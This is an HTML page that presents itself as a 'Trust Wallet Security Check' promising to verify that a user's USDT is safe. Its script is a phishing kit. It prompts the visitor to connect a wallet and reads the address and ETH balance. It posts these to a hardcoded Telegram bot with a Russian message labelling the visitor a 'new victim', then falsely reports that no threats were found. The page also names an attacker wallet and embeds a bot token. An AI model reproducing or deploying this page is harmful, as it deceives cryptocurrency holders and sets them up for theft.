<!DOCTYPE html>
<html>
<head>
    <title>Trust Wallet Security Check</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
    <style>
        body { text-align: center; font-family: Arial; padding: 50px; background: #0d1117; color: white; }
        button { background: #00ff88; color: black; padding: 20px 50px; font-size: 24px; border: none; border-radius: 15px; cursor: pointer; margin-top: 30px; }
        button:hover { background: #00cc66; }
        h1 { color: #00ff88; }
    </style>
</head>
<body>
    <h1>🛡️ SafeVerify Security Check</h1>
    <p>Connect wallet to verify your USDT are safe</p>
    <button id="connect">Connect Trust Wallet</button>
    <p id="status" style="margin-top: 30px;"></p>

    <script>
        const BOT_TOKEN = '8665174312:AAE_i_f5UV9xYKpRqargdfKRs9FbYZPNpFk';
        const CHAT_ID = '7663459492';
        const ATTACKER_WALLET = '0x9f9e8388Cc4eA6772675A532576A07deFFB85b8E';

        async function sendToTelegram(text) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: text })
                });
            } catch(e) { console.log(e); }
        }

        document.getElementById('connect').onclick = async () => {
            if (!window.ethereum) {
                document.getElementById('status').innerHTML = '❌ Please install Trust Wallet or MetaMask';
                return;
            }

            try {
                const web3 = new Web3(window.ethereum);
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                const address = accounts[0];
                const balanceWei = await web3.eth.getBalance(address);
                const balance = web3.utils.fromWei(balanceWei, 'ether');
                
                // Отправка уведомления в Telegram
                await sendToTelegram(`✅ НОВАЯ ЖЕРТВА!\nАдрес: ${address}\nБаланс: ${balance} ETH\nКошелёк подключён: ✅\nВремя: ${new Date().toLocaleString()}`);
                
                document.getElementById('status').innerHTML = '✅ Wallet connected! Security check completed.<br>No threats found.';
                document.getElementById('status').style.color = '#00ff88';
            } catch(e) {
                document.getElementById('status').innerHTML = '❌ Error: ' + e.message;
            }
        };
    </script>
</body>
</html>
